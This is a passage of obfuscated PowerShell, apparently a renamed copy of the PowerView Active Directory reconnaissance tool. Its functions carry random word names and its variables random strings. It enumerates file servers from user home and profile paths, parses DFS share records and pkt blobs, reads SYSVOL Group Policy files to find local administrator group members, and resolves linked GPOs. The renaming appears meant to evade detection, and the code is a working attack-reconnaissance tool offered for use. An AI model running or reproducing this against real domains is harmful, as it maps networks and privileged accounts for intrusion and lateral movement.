                    $IRuFkyVH99 = orthodoxy @ContextArguments
                    if ($IRuFkyVH99) {
                        $TYwqHZTv99 = $IRuFkyVH99.Identity
                    }
                }
                else {
                    $IRuFkyVH99 = $GCVdxnVh99
                    $TYwqHZTv99 = $RLVMFVRY99
                }
                Write-Verbose "[rescued] Removing member '$RLVMFVRY99' from group '$FMEdvzGY99'"
                $RLVMFVRY99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($IRuFkyVH99.Context, $TYwqHZTv99)
                $Group.Members.Remove($RLVMFVRY99)
                $Group.Save()
            }
        }
    }
}
function perhaps {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function jailed {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }
        $cODXoeui99 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($hfELBeHx99 in $StsWGohF99) {
                $cODXoeui99['Domain'] = $hfELBeHx99
                $TyAvUtRw99 = Zimbabweans @SearcherArguments
                $(ForEach($EACafaPC99 in $TyAvUtRw99.FindAll()) {if ($EACafaPC99.Properties['homedirectory']) {jailed($EACafaPC99.Properties['homedirectory'])}if ($EACafaPC99.Properties['scriptpath']) {jailed($EACafaPC99.Properties['scriptpath'])}if ($EACafaPC99.Properties['profilepath']) {jailed($EACafaPC99.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $TyAvUtRw99 = Zimbabweans @SearcherArguments
            $(ForEach($EACafaPC99 in $TyAvUtRw99.FindAll()) {if ($EACafaPC99.Properties['homedirectory']) {jailed($EACafaPC99.Properties['homedirectory'])}if ($EACafaPC99.Properties['scriptpath']) {jailed($EACafaPC99.Properties['scriptpath'])}if ($EACafaPC99.Properties['profilepath']) {jailed($EACafaPC99.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}
function debonair {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $kwBJvejl99 = 'All'
    )
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        function edict {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )
            $bin = $Pkt
            $BqyhVGsb99 = [bitconverter]::ToUInt32($bin[0..3],0)
            $rvJTikWb99 = [bitconverter]::ToUInt32($bin[4..7],0)
            $LIdFeKYN99 = 8
            $dohUFeRt99 = @()
            for($i=1; $i -le $rvJTikWb99; $i++){
                $pjayJqnv99 = $LIdFeKYN99
                $XLjszDuy99 = $LIdFeKYN99 + 1
                $ppAUBAXQ99 = [bitconverter]::ToUInt16($bin[$pjayJqnv99..$XLjszDuy99],0)
                $VJWjlMcP99 = $XLjszDuy99 + 1
                $PtuYvkdX99 = $VJWjlMcP99 + $ppAUBAXQ99 - 1
                $GLoiTAeT99 = [System.Text.Encoding]::Unicode.GetString($bin[$VJWjlMcP99..$PtuYvkdX99])
                $MuZffGwi99 = $PtuYvkdX99 + 1
                $ODNnLZxu99 = $MuZffGwi99 + 3
                $GAHHhJHY99 = [bitconverter]::ToUInt32($bin[$MuZffGwi99..$ODNnLZxu99],0)
                $qcrbdJhU99 = $ODNnLZxu99 + 1
                $edWpiPnR99 = $qcrbdJhU99 + $GAHHhJHY99 - 1
                $GtCEscUm99 = $bin[$qcrbdJhU99..$edWpiPnR99]
                switch -wildcard ($GLoiTAeT99) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        $cbLZLhOJ99 = 0
                        $CcnnVjnW99 = 15
                        $xRrAmIWT99 = [byte[]]$GtCEscUm99[$cbLZLhOJ99..$CcnnVjnW99]
                        $guid = New-Object Guid(,$xRrAmIWT99) # should match $fxWSMsbO99
                        $fuWWbtUT99 = $CcnnVjnW99 + 1
                        $OnAycqZL99 = $fuWWbtUT99 + 1
                        $LLqaRAVd99 = [bitconverter]::ToUInt16($GtCEscUm99[$fuWWbtUT99..$OnAycqZL99],0)
                        $GSbQbMeq99 = $OnAycqZL99 + 1
                        $GlPEeAsI99 = $GSbQbMeq99 + $LLqaRAVd99 - 1
                        $DElePGXn99 = [System.Text.Encoding]::Unicode.GetString($GtCEscUm99[$GSbQbMeq99..$GlPEeAsI99])
                        $uXzPxKnA99 = $GlPEeAsI99 + 1
                        $xGROwEqC99 = $uXzPxKnA99 + 1
                        $Vwpomwzi99 = [bitconverter]::ToUInt16($GtCEscUm99[$uXzPxKnA99..$xGROwEqC99],0)
                        $RfnBmFDC99 = $xGROwEqC99 + 1
                        $OHxAbMQq99 = $RfnBmFDC99 + $Vwpomwzi99 - 1
                        $fiGgSyHb99 = [System.Text.Encoding]::Unicode.GetString($GtCEscUm99[$RfnBmFDC99..$OHxAbMQq99])
                        $netlzjTV99 = $OHxAbMQq99 + 1
                        $NYKIdkWb99 = $netlzjTV99 + 3
                        $type = [bitconverter]::ToUInt32($GtCEscUm99[$netlzjTV99..$NYKIdkWb99],0)
                        $kzvXGEle99 = $NYKIdkWb99 + 1
                        $LKoTPobc99 = $kzvXGEle99 + 3
                        $state = [bitconverter]::ToUInt32($GtCEscUm99[$kzvXGEle99..$LKoTPobc99],0)
                        $BRpJwPwK99 = $LKoTPobc99 + 1
                        $CvlLfkqi99 = $BRpJwPwK99 + 1
                        $eGWChWxU99 = [bitconverter]::ToUInt16($GtCEscUm99[$BRpJwPwK99..$CvlLfkqi99],0)
                        $dakSrgoO99 = $CvlLfkqi99 + 1
                        $BDpzKABz99 = $dakSrgoO99 + $eGWChWxU99 - 1
                        if ($eGWChWxU99 -gt 0)  {
                            $PMqrFlwg99 = [System.Text.Encoding]::Unicode.GetString($GtCEscUm99[$dakSrgoO99..$BDpzKABz99])
                        }
                        $IFuHuani99 = $BDpzKABz99 + 1
                        $uZtYJeVQ99 = $IFuHuani99 + 7
                        $xyCcaeDs99 = $GtCEscUm99[$IFuHuani99..$uZtYJeVQ99] #dword lowDateTime #dword highdatetime
                        $nfXtibLx99 = $uZtYJeVQ99 + 1
                        $lUqwyiAZ99 = $nfXtibLx99 + 7
                        $WzHzrUGi99 = $GtCEscUm99[$nfXtibLx99..$lUqwyiAZ99]
                        $ohPxiQcn99 = $lUqwyiAZ99 + 1
                        $quWXjOmq99 = $ohPxiQcn99 + 7
                        $TIBnMCGM99 = $GtCEscUm99[$ohPxiQcn99..$quWXjOmq99]
                        $VtvVxagx99 = $quWXjOmq99  + 1
                        $NAlvsjDw99 = $VtvVxagx99 + 3
                        $kwBJvejl99 = [bitconverter]::ToUInt32($GtCEscUm99[$VtvVxagx99..$NAlvsjDw99],0)
                        $itDrDTXX99 = $NAlvsjDw99 + 1
                        $HtORoZri99 = $itDrDTXX99 + 3
                        $ShcrUKIm99 = [bitconverter]::ToUInt32($GtCEscUm99[$itDrDTXX99..$HtORoZri99],0)
                        $JqCJWzVZ99 = $HtORoZri99 + 1
                        $ZaoVqxEd99 = $JqCJWzVZ99 + $ShcrUKIm99 - 1
                        $BqYALyxn99 = $GtCEscUm99[$JqCJWzVZ99..$ZaoVqxEd99]
                        $aHOYOzSw99 = $ZaoVqxEd99 + 1
                        $qpWPHzUC99 = $aHOYOzSw99 + 3
                        $ZeeckMIv99 = [bitconverter]::ToUInt32($GtCEscUm99[$aHOYOzSw99..$qpWPHzUC99],0)
                        $RggmhQOL99 = $qpWPHzUC99 + 1
                        $XgzTFQGd99 = $RggmhQOL99 + $ZeeckMIv99 - 1
                        $VpCDQiVi99 = $GtCEscUm99[$RggmhQOL99..$XgzTFQGd99]
                        $gsRwBxfh99 = $XgzTFQGd99 + 1
                        $FGnbZKTl99 = $gsRwBxfh99 + 3
                        $IZTCflnh99 = [bitconverter]::ToUInt32($GtCEscUm99[$gsRwBxfh99..$FGnbZKTl99],0)
                        $wSnWiuXa99 = 0
                        $xdMORuOO99 = $wSnWiuXa99 + 3
                        $UfQkLcRM99 = [bitconverter]::ToUInt32($BqYALyxn99[$wSnWiuXa99..$xdMORuOO99],0)
                        $QZGrCiGW99 = $xdMORuOO99 + 1
                        for($j=1; $j -le $UfQkLcRM99; $j++){
                            $JTvBpftJ99 = $QZGrCiGW99
                            $qxRKIYJw99 = $JTvBpftJ99 + 3
                            $gzPGhlDe99 = [bitconverter]::ToUInt32($BqYALyxn99[$JTvBpftJ99..$qxRKIYJw99],0)
                            $mgJRXdKt99 = $qxRKIYJw99 + 1
                            $tiTZcqdp99 = $mgJRXdKt99 + 7
                            $BmpHGcfK99 = $BqYALyxn99[$mgJRXdKt99..$tiTZcqdp99]
                            $ZDotNBbU99 = $tiTZcqdp99 + 1
                            $DZMTpXGD99 = $ZDotNBbU99 + 3
                            $jLlewgSp99 = [bitconverter]::ToUInt32($BqYALyxn99[$ZDotNBbU99..$DZMTpXGD99],0)
                            $SveVNbUW99 = $DZMTpXGD99 + 1
                            $NoOpdYrO99 = $SveVNbUW99 + 3
                            $ChTvttOG99 = [bitconverter]::ToUInt32($BqYALyxn99[$SveVNbUW99..$NoOpdYrO99],0)
                            $yBdVCBjf99 = $NoOpdYrO99 + 1
                            $StcJLcQo99 = $yBdVCBjf99 + 1
                            $FxsryCCX99 = [bitconverter]::ToUInt16($BqYALyxn99[$yBdVCBjf99..$StcJLcQo99],0)
                            $kWcThdZQ99 = $StcJLcQo99 + 1
                            $npsGTZlk99 = $kWcThdZQ99 + $FxsryCCX99 - 1
                            $sbpKSTYG99 = [System.Text.Encoding]::Unicode.GetString($BqYALyxn99[$kWcThdZQ99..$npsGTZlk99])
                            $blGResyB99 = $npsGTZlk99 + 1
                            $VcGRFbww99 = $blGResyB99 + 1
                            $YFRnkjbs99 = [bitconverter]::ToUInt16($BqYALyxn99[$blGResyB99..$VcGRFbww99],0)
                            $bnasHUHD99 = $VcGRFbww99 + 1
                            $KRRAxCUn99 = $bnasHUHD99 + $YFRnkjbs99 - 1
                            $nYDKUnTi99 = [System.Text.Encoding]::Unicode.GetString($BqYALyxn99[$bnasHUHD99..$KRRAxCUn99])
                            $urUEwrdG99 += "\\$sbpKSTYG99\$nYDKUnTi99"
                            $QZGrCiGW99 = $KRRAxCUn99 + 1
                        }
                    }
                }
                $LIdFeKYN99 = $edWpiPnR99 + 1
                $KJLEirqg99 = @{
                    'Name' = $GLoiTAeT99
                    'Prefix' = $DElePGXn99
                    'TargetList' = $urUEwrdG99
                }
                $dohUFeRt99 += New-Object -TypeName PSObject -Property $KJLEirqg99
                $DElePGXn99 = $Null
                $GLoiTAeT99 = $Null
                $urUEwrdG99 = $Null
            }
            $sDVINhXf99 = @()
            $dohUFeRt99 | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $sDVINhXf99 += $_.split('\')[2]
                    }
                }
            }
            $sDVINhXf99
        }
        function mistrusted {
            [CmdletBinding()]
            Param(
                [String]
                $StsWGohF99,
                [String]
                $sVFAWYQs99,
                [String]
                $sWbqYnBA99,
                [String]
                $hZznjEbB99 = 'Subtree',
                [Int]
                $jrZpVEwq99 = 200,
                [Int]
                $kkbrymyp99,
                [Switch]
                $YXMSPUCr99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $DegNROrc99 = [Management.Automation.PSCredential]::Empty
            )
            $LFJUbSfm99 = Zimbabweans @PSBoundParameters
            if ($LFJUbSfm99) {
                $NeYztyAF99 = @()
                $LFJUbSfm99.filter = '(&(objectClass=fTDfs))'
                try {
                    $oboKDFwv99 = $LFJUbSfm99.FindAll()
                    $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                        $pwEfoKvn99 = $_.Properties
                        $UJDtfhok99 = $pwEfoKvn99.remoteservername
                        $Pkt = $pwEfoKvn99.pkt
                        $NeYztyAF99 += $UJDtfhok99 | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$pwEfoKvn99.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[debonair] mistrusted error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($oboKDFwv99) {
                        try { $oboKDFwv99.dispose() }
                        catch {
                            Write-Verbose "[debonair] mistrusted error disposing of the Results object: $_"
                        }
                    }
                    $LFJUbSfm99.dispose()
                    if ($pkt -and $pkt[0]) {
                        edict $pkt[0] | ForEach-Object {
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$pwEfoKvn99.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[debonair] mistrusted error : $_"
                }
                $NeYztyAF99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
        function masculine {
            [CmdletBinding()]
            Param(
                [String]
                $StsWGohF99,
                [String]
                $sVFAWYQs99,
                [String]
                $sWbqYnBA99,
                [String]
                $hZznjEbB99 = 'Subtree',
                [Int]
                $jrZpVEwq99 = 200,
                [Int]
                $kkbrymyp99,
                [Switch]
                $YXMSPUCr99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $DegNROrc99 = [Management.Automation.PSCredential]::Empty
            )
            $LFJUbSfm99 = Zimbabweans @PSBoundParameters
            if ($LFJUbSfm99) {
                $NeYztyAF99 = @()
                $LFJUbSfm99.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $LFJUbSfm99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
                try {
                    $oboKDFwv99 = $LFJUbSfm99.FindAll()
                    $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                        $pwEfoKvn99 = $_.Properties
                        $urUEwrdG99 = $pwEfoKvn99.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($urUEwrdG99[2..($urUEwrdG99.Length-1)])
                        $NeYztyAF99 += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $twxLvKNa99 = $_.InnerText
                                if ( $twxLvKNa99.Contains('\') ) {
                                    $IAKosuES99 = $twxLvKNa99.split('\')[3]
                                    $MVreDyRZ99 = $pwEfoKvn99.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$IAKosuES99$MVreDyRZ99";'RemoteServerName'=$twxLvKNa99.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[debonair] masculine error in parsing target : $_"
                            }
                        }
                    }
                    if ($oboKDFwv99) {
                        try { $oboKDFwv99.dispose() }
                        catch {
                            Write-Verbose "[debonair] Error disposing of the Results object: $_"
                        }
                    }
                    $LFJUbSfm99.dispose()
                }
                catch {
                    Write-Warning "[debonair] masculine error : $_"
                }
                $NeYztyAF99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }
    PROCESS {
        $NeYztyAF99 = @()
        if ($PSBoundParameters['Domain']) {
            ForEach ($hfELBeHx99 in $StsWGohF99) {
                $cODXoeui99['Domain'] = $hfELBeHx99
                if ($kwBJvejl99 -match 'all|1') {
                    $NeYztyAF99 += mistrusted @SearcherArguments
                }
                if ($kwBJvejl99 -match 'all|2') {
                    $NeYztyAF99 += masculine @SearcherArguments
                }
            }
        }
        else {
            if ($kwBJvejl99 -match 'all|1') {
                $NeYztyAF99 += mistrusted @SearcherArguments
            }
            if ($kwBJvejl99 -match 'all|2') {
                $NeYztyAF99 += masculine @SearcherArguments
            }
        }
        $NeYztyAF99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}
function fatally {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $evOatchi99,
        [Switch]
        $kPTepGVF99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $nSJRACcN99 = @{}
    }
    PROCESS {
        try {
            if (($evOatchi99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $AUlcLrWP99 = "\\$((New-Object System.Uri($evOatchi99)).Host)\SYSVOL"
                if (-not $nSJRACcN99[$AUlcLrWP99]) {
                    disservice -Path $AUlcLrWP99 -DegNROrc99 $DegNROrc99
                    $nSJRACcN99[$AUlcLrWP99] = $True
                }
            }
            $yjIvOtdR99 = $evOatchi99
            if (-not $yjIvOtdR99.EndsWith('.inf')) {
                $yjIvOtdR99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }
            Write-Verbose "[fatally] Parsing GptTmplPath: $yjIvOtdR99"
            if ($PSBoundParameters['OutputObject']) {
                $rkdNvitX99 = assailable -Path $yjIvOtdR99 -kPTepGVF99 -ErrorAction Stop
                if ($rkdNvitX99) {
                    $rkdNvitX99 | Add-Member Noteproperty 'Path' $yjIvOtdR99
                    $rkdNvitX99
                }
            }
            else {
                $rkdNvitX99 = assailable -Path $yjIvOtdR99 -ErrorAction Stop
                if ($rkdNvitX99) {
                    $rkdNvitX99['Path'] = $yjIvOtdR99
                    $rkdNvitX99
                }
            }
        }
        catch {
            Write-Verbose "[fatally] Error parsing $yjIvOtdR99 : $_"
        }
    }
    END {
        $nSJRACcN99.Keys | ForEach-Object { moronic -Path $_ }
    }
}
function coherently {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $bbInBdAQ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $nSJRACcN99 = @{}
    }
    PROCESS {
        try {
            if (($bbInBdAQ99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $AUlcLrWP99 = "\\$((New-Object System.Uri($bbInBdAQ99)).Host)\SYSVOL"
                if (-not $nSJRACcN99[$AUlcLrWP99]) {
                    disservice -Path $AUlcLrWP99 -DegNROrc99 $DegNROrc99
                    $nSJRACcN99[$AUlcLrWP99] = $True
                }
            }
            [XML]$RINzHymP99 = Get-Content -Path $bbInBdAQ99 -ErrorAction Stop
            $RINzHymP99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
                $nrOpsRrf99 = $_.Properties.groupName
                $CogLiWqY99 = $_.Properties.groupSid
                if (-not $CogLiWqY99) {
                    if ($nrOpsRrf99 -match 'Administrators') {
                        $CogLiWqY99 = 'S-1-5-32-544'
                    }
                    elseif ($nrOpsRrf99 -match 'Remote Desktop') {
                        $CogLiWqY99 = 'S-1-5-32-555'
                    }
                    elseif ($nrOpsRrf99 -match 'Guests') {
                        $CogLiWqY99 = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $CogLiWqY99 = peter -OFBZmnwK99 $nrOpsRrf99 -DegNROrc99 $DegNROrc99
                        }
                        else {
                            $CogLiWqY99 = peter -OFBZmnwK99 $nrOpsRrf99
                        }
                    }
                }
                $BznuurjO99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if ($BznuurjO99) {
                    if ($_.filters) {
                        $VrOAjGLw99 = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $VrOAjGLw99 = $Null
                    }
                    if ($BznuurjO99 -isnot [System.Array]) { $BznuurjO99 = @($BznuurjO99) }
                    $iqfvCDhR99 = New-Object PSObject
                    $iqfvCDhR99 | Add-Member Noteproperty 'GPOPath' $LQzKIBKi99
                    $iqfvCDhR99 | Add-Member Noteproperty 'Filters' $VrOAjGLw99
                    $iqfvCDhR99 | Add-Member Noteproperty 'GroupName' $nrOpsRrf99
                    $iqfvCDhR99 | Add-Member Noteproperty 'GroupSID' $CogLiWqY99
                    $iqfvCDhR99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $iqfvCDhR99 | Add-Member Noteproperty 'GroupMembers' $BznuurjO99
                    $iqfvCDhR99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $iqfvCDhR99
                }
            }
        }
        catch {
            Write-Verbose "[coherently] Error parsing $LQzKIBKi99 : $_"
        }
    }
    END {
        $nSJRACcN99.Keys | ForEach-Object { moronic -Path $_ }
    }
}
function outskirts {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $FMEdvzGY99,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $hctnvgyd99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $TYwqHZTv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $qEoKaesE99 = Zimbabweans @SearcherArguments
    }
    PROCESS {
        if ($qEoKaesE99) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $OMsgkxNy99 = @()
                if ($cODXoeui99['Properties']) {
                    $UZhUERNR99 = $cODXoeui99['Properties']
                }
                $cODXoeui99['Properties'] = 'distinguishedname,dnshostname'
                $NkPRaTXB99 = $Null
                if ($PSBoundParameters['ComputerIdentity']) {
                    $cODXoeui99['Identity'] = $hctnvgyd99
                    $YaYHUvEO99 = snivel @SearcherArguments -JonZpKBd99 | Select-Object -First 1
                    if(-not $YaYHUvEO99) {
                        Write-Verbose "[outskirts] Computer '$hctnvgyd99' not found!"
                    }
                    $MSCuKRTY99 = $YaYHUvEO99.distinguishedname
                    $NkPRaTXB99 = $YaYHUvEO99.dnshostname
                }
                else {
                    $cODXoeui99['Identity'] = $TYwqHZTv99
                    $User = Lille @SearcherArguments -JonZpKBd99 | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[outskirts] User '$TYwqHZTv99' not found!"
                    }
                    $MSCuKRTY99 = $User.distinguishedname
                }
                $qolnWkDq99 = @()
                $qolnWkDq99 += $MSCuKRTY99.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $MSCuKRTY99.SubString($MSCuKRTY99.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[outskirts] object OUs: $qolnWkDq99"
                if ($qolnWkDq99) {
                    $cODXoeui99.Remove('Properties')
                    $xtppELQW99 = $False
                    ForEach($cexIEszi99 in $qolnWkDq99) {
                        $cODXoeui99['Identity'] = $cexIEszi99
                        $OMsgkxNy99 += newspaperwomen @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $qunNiXng99 = $Parts[1]
                                        if ($xtppELQW99) {
                                            if ($qunNiXng99 -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                $xtppELQW99 = $True
                            }
                        }
                    }
                }
                if ($NkPRaTXB99) {
